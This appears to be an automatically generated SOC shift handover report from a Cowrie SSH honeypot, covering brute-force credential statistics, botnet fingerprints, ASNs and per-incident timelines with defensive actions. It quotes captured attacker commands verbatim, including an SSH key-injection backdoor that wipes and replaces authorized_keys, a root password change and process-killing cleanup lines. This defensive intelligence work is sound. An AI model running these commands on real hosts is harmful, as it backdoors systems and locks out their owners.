# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-13 |
| **Generated At** | 2026-05-13T10:33:30Z |
| **Shift Time** | 10:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **378** |
| Confirmed Threats | **314** |
| False Positives Filtered | **64** (16.9%) |
| Unique Attacker IPs | **54** |
| Countries of Origin | **26** |
| High Severity Cases | **68** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **310** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **158** |
| Unique Credential Pairs | **94** |
| Unique Usernames | **51** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **53** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 69 |
| `345gs5662d34` | 29 |
| `admin` | 9 |
| `firewall` | 2 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 30 |
| `345gs5662d34` | 29 |
| `123456` | 6 |
| `download` | 3 |
| `Server2012` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 30 |
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `download` | 3 |
| `root` | `Server2012` | 2 |
| `root` | `zhang123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789.` | `103.49.238.35` | 2026-05-13T06:56:30 |
| `root` | `3245gs5662d34` | `103.49.238.35` | 2026-05-13T06:56:33 |
| `root` | `Server2012` | `138.197.164.175` | 2026-05-13T07:53:41 |
| `root` | `3245gs5662d34` | `138.197.164.175` | 2026-05-13T07:53:47 |
| `root` | `zhang123456` | `51.178.114.78` | 2026-05-13T07:56:49 |
| `root` | `3245gs5662d34` | `51.178.114.78` | 2026-05-13T07:56:53 |
| `root` | `Xu@123456` | `80.102.218.187` | 2026-05-13T08:01:11 |
| `root` | `3245gs5662d34` | `80.102.218.187` | 2026-05-13T08:01:15 |
| `root` | `asdf123.` | `189.113.38.56` | 2026-05-13T08:01:44 |
| `root` | `3245gs5662d34` | `189.113.38.56` | 2026-05-13T08:01:52 |
| `root` | `download` | `5.182.83.231` | 2026-05-13T08:03:35 |
| `root` | `3245gs5662d34` | `5.182.83.231` | 2026-05-13T08:03:39 |
| `root` | `download` | `223.17.5.126` | 2026-05-13T08:04:56 |
| `root` | `3245gs5662d34` | `223.17.5.126` | 2026-05-13T08:05:05 |
| `root` | `Aa!123456` | `221.163.5.228` | 2026-05-13T08:05:23 |
| `root` | `3245gs5662d34` | `221.163.5.228` | 2026-05-13T08:05:27 |
| `root` | `qwe123!@` | `83.168.69.215` | 2026-05-13T08:10:21 |
| `root` | `!qaz@WSX` | `83.168.69.215` | 2026-05-13T08:10:37 |
| `root` | `root1234` | `83.168.69.215` | 2026-05-13T08:10:40 |
| `root` | `asdf123.` | `221.163.5.228` | 2026-05-13T08:10:52 |
| `root` | `111` | `83.168.69.215` | 2026-05-13T08:11:00 |
| `root` | `Password@123` | `83.168.69.215` | 2026-05-13T08:11:02 |
| `root` | `test1234` | `83.168.69.215` | 2026-05-13T08:11:03 |
| `root` | `Server2012` | `221.163.5.228` | 2026-05-13T08:19:53 |
| `root` | `zhang123456` | `221.163.5.228` | 2026-05-13T08:23:35 |
| `root` | `download` | `221.163.5.228` | 2026-05-13T08:28:57 |
| `root` | `Xu@123456` | `221.163.5.228` | 2026-05-13T08:30:45 |
| `root` | `1234567890Aa` | `221.163.5.228` | 2026-05-13T08:34:29 |
| `root` | `admin1234!` | `221.163.5.228` | 2026-05-13T08:36:23 |
| `root` | `78ui&*UI` | `181.52.238.13` | 2026-05-13T08:52:20 |
| `root` | `3245gs5662d34` | `181.52.238.13` | 2026-05-13T08:52:27 |
| `root` | `admin` | `125.140.145.62` | 2026-05-13T08:52:48 |
| `root` | `bugaosuni` | `103.158.29.100` | 2026-05-13T08:55:06 |
| `root` | `3245gs5662d34` | `103.158.29.100` | 2026-05-13T08:55:09 |
| `root` | `123456Zx` | `116.123.150.231` | 2026-05-13T08:58:00 |
| `root` | `3245gs5662d34` | `116.123.150.231` | 2026-05-13T08:58:06 |
| `root` | `123QWE!@#` | `103.158.29.100` | 2026-05-13T09:02:42 |
| `root` | `P@i#3.1415` | `116.123.150.231` | 2026-05-13T09:03:43 |
| `root` | `345ert#$%ERT` | `103.158.29.100` | 2026-05-13T09:04:37 |
| `root` | `root2026!@#` | `103.158.29.100` | 2026-05-13T09:06:26 |
| `root` | `1314` | `106.13.142.171` | 2026-05-13T09:07:18 |
| `root` | `server@23` | `103.158.29.100` | 2026-05-13T09:10:15 |
| `root` | `dany` | `124.156.202.242` | 2026-05-13T09:11:29 |
| `root` | `3245gs5662d34` | `124.156.202.242` | 2026-05-13T09:11:31 |
| `root` | `123456Dd` | `103.158.29.100` | 2026-05-13T09:12:12 |
| `root` | `dms` | `190.181.4.12` | 2026-05-13T09:15:18 |
| `root` | `3245gs5662d34` | `190.181.4.12` | 2026-05-13T09:15:26 |
| `root` | `King@123` | `103.158.29.100` | 2026-05-13T09:17:58 |
| `root` | `ZAQ!xsw2` | `103.158.29.100` | 2026-05-13T09:23:29 |
| `root` | `Mihai1982` | `211.178.247.182` | 2026-05-13T10:12:07 |
| `root` | `3245gs5662d34` | `211.178.247.182` | 2026-05-13T10:12:10 |
| `root` | `zxcvb` | `112.151.178.49` | 2026-05-13T10:19:33 |
| `root` | `3245gs5662d34` | `112.151.178.49` | 2026-05-13T10:19:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **378** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 130 |
| Go SSH scanner | 31 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 73 | 11 |
| `3cb24313ef79...` | Mirai/variant | 36 | 1 |
| `0a07365cc01f...` | Generic scanner | 29 | 1 |
| `af8223ac9914...` | libssh-based | 9 | 3 |
| `03a80b21afa8...` | Modern SSH client | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 73 | 11 | Mirai/variant |
| `3cb24313ef79...` | libssh | 36 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 29 | 1 | Generic scanner |
| `af8223ac9914...` | libssh | 9 | 3 | libssh-based |
| `03a80b21afa8...` | libssh | 6 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 15 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:yQgzlYax11O6"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.13.142.171`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `116.123.150.231`, `211.178.247.182`, `138.197.164.175`, `124.156.202.242`, `221.163.5.228`, `103.158.29.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **54** |
| Unique ASNs | **43** |
| High-Risk ASNs | **35** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS21859` | Zenlayer Inc | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 2 | HIGH |
| `AS25019` | Saudi Telecom Company JSC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (68)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6d7710790585

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:56 |
| **Last Seen** | 2026-05-13 06:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:56:30` | `cowrie.session.connect` |
| `2026-05-13 06:56:30` | `cowrie.client.version` |
| `2026-05-13 06:56:30` | `cowrie.client.kex` |
| `2026-05-13 06:56:30` | `cowrie.login.success` |
| `2026-05-13 06:56:31` | `cowrie.session.params` |
| `2026-05-13 06:56:31` | `cowrie.command.input` |
| `2026-05-13 06:56:31` | `cowrie.command.failed` |
| `2026-05-13 06:56:31` | `cowrie.log.closed` |
| `2026-05-13 06:56:31` | `cowrie.session.params` |
| `2026-05-13 06:56:31` | `cowrie.command.input` |
| `2026-05-13 06:56:31` | `cowrie.session.file_download` |
| `2026-05-13 06:56:31` | `cowrie.log.closed` |
| `2026-05-13 06:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01cf1c985f43

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:56 |
| **Last Seen** | 2026-05-13 06:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 06:56:33` | `cowrie.session.connect` |
| `2026-05-13 06:56:33` | `cowrie.client.version` |
| `2026-05-13 06:56:33` | `cowrie.client.kex` |
| `2026-05-13 06:56:33` | `cowrie.login.success` |
| `2026-05-13 06:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a69d4fd5ad3

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-05-13 07:53 |
| **Last Seen** | 2026-05-13 07:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 07:53:39` | `cowrie.session.connect` |
| `2026-05-13 07:53:39` | `cowrie.client.version` |
| `2026-05-13 07:53:40` | `cowrie.client.kex` |
| `2026-05-13 07:53:41` | `cowrie.login.success` |
| `2026-05-13 07:53:41` | `cowrie.session.params` |
| `2026-05-13 07:53:41` | `cowrie.command.input` |
| `2026-05-13 07:53:41` | `cowrie.command.failed` |
| `2026-05-13 07:53:42` | `cowrie.log.closed` |
| `2026-05-13 07:53:42` | `cowrie.session.params` |
| `2026-05-13 07:53:42` | `cowrie.command.input` |
| `2026-05-13 07:53:42` | `cowrie.session.file_download` |
| `2026-05-13 07:53:42` | `cowrie.log.closed` |
| `2026-05-13 07:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb4c159753ae

| Field | Detail |
|---|---|
| **Source IP** | `138.197.164[.]175` |
| **First Seen** | 2026-05-13 07:53 |
| **Last Seen** | 2026-05-13 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 07:53:46` | `cowrie.session.connect` |
| `2026-05-13 07:53:46` | `cowrie.client.version` |
| `2026-05-13 07:53:46` | `cowrie.client.kex` |
| `2026-05-13 07:53:47` | `cowrie.login.success` |
| `2026-05-13 07:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.164[.]175` to AbuseIPDB if not already reported
- [ ] Block `138.197.164[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d25ba4a994

| Field | Detail |
|---|---|
| **Source IP** | `51.178.114[.]78` |
| **First Seen** | 2026-05-13 07:56 |
| **Last Seen** | 2026-05-13 07:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 07:56:49` | `cowrie.session.connect` |
| `2026-05-13 07:56:49` | `cowrie.client.version` |
| `2026-05-13 07:56:49` | `cowrie.client.kex` |
| `2026-05-13 07:56:49` | `cowrie.login.success` |
| `2026-05-13 07:56:50` | `cowrie.session.params` |
| `2026-05-13 07:56:50` | `cowrie.command.input` |
| `2026-05-13 07:56:50` | `cowrie.command.failed` |
| `2026-05-13 07:56:50` | `cowrie.log.closed` |
| `2026-05-13 07:56:50` | `cowrie.session.params` |
| `2026-05-13 07:56:50` | `cowrie.command.input` |
| `2026-05-13 07:56:50` | `cowrie.session.file_download` |
| `2026-05-13 07:56:50` | `cowrie.log.closed` |
| `2026-05-13 07:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.178.114[.]78` to AbuseIPDB if not already reported
- [ ] Block `51.178.114[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bbd98b60c7c

| Field | Detail |
|---|---|
| **Source IP** | `51.178.114[.]78` |
| **First Seen** | 2026-05-13 07:56 |
| **Last Seen** | 2026-05-13 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 07:56:52` | `cowrie.session.connect` |
| `2026-05-13 07:56:52` | `cowrie.client.version` |
| `2026-05-13 07:56:53` | `cowrie.client.kex` |
| `2026-05-13 07:56:53` | `cowrie.login.success` |
| `2026-05-13 07:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.178.114[.]78` to AbuseIPDB if not already reported
- [ ] Block `51.178.114[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8de6270984d8

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-13 08:01 |
| **Last Seen** | 2026-05-13 08:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:01:10` | `cowrie.session.connect` |
| `2026-05-13 08:01:10` | `cowrie.client.version` |
| `2026-05-13 08:01:10` | `cowrie.client.kex` |
| `2026-05-13 08:01:11` | `cowrie.login.success` |
| `2026-05-13 08:01:11` | `cowrie.session.params` |
| `2026-05-13 08:01:11` | `cowrie.command.input` |
| `2026-05-13 08:01:11` | `cowrie.command.failed` |
| `2026-05-13 08:01:11` | `cowrie.log.closed` |
| `2026-05-13 08:01:12` | `cowrie.session.params` |
| `2026-05-13 08:01:12` | `cowrie.command.input` |
| `2026-05-13 08:01:12` | `cowrie.session.file_download` |
| `2026-05-13 08:01:12` | `cowrie.log.closed` |
| `2026-05-13 08:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae845f78edd0

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-13 08:01 |
| **Last Seen** | 2026-05-13 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:01:14` | `cowrie.session.connect` |
| `2026-05-13 08:01:14` | `cowrie.client.version` |
| `2026-05-13 08:01:15` | `cowrie.client.kex` |
| `2026-05-13 08:01:15` | `cowrie.login.success` |
| `2026-05-13 08:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b1026b6886

| Field | Detail |
|---|---|
| **Source IP** | `189.113.38[.]56` |
| **First Seen** | 2026-05-13 08:01 |
| **Last Seen** | 2026-05-13 08:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:01:42` | `cowrie.session.connect` |
| `2026-05-13 08:01:42` | `cowrie.client.version` |
| `2026-05-13 08:01:42` | `cowrie.client.kex` |
| `2026-05-13 08:01:44` | `cowrie.login.success` |
| `2026-05-13 08:01:45` | `cowrie.session.params` |
| `2026-05-13 08:01:45` | `cowrie.command.input` |
| `2026-05-13 08:01:45` | `cowrie.command.failed` |
| `2026-05-13 08:01:45` | `cowrie.log.closed` |
| `2026-05-13 08:01:46` | `cowrie.session.params` |
| `2026-05-13 08:01:46` | `cowrie.command.input` |
| `2026-05-13 08:01:46` | `cowrie.session.file_download` |
| `2026-05-13 08:01:46` | `cowrie.log.closed` |
| `2026-05-13 08:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.113.38[.]56` to AbuseIPDB if not already reported
- [ ] Block `189.113.38[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015e24f878fa

| Field | Detail |
|---|---|
| **Source IP** | `189.113.38[.]56` |
| **First Seen** | 2026-05-13 08:01 |
| **Last Seen** | 2026-05-13 08:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:01:50` | `cowrie.session.connect` |
| `2026-05-13 08:01:50` | `cowrie.client.version` |
| `2026-05-13 08:01:50` | `cowrie.client.kex` |
| `2026-05-13 08:01:52` | `cowrie.login.success` |
| `2026-05-13 08:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.113.38[.]56` to AbuseIPDB if not already reported
- [ ] Block `189.113.38[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3abfe2d36ed6

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-05-13 08:03 |
| **Last Seen** | 2026-05-13 08:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
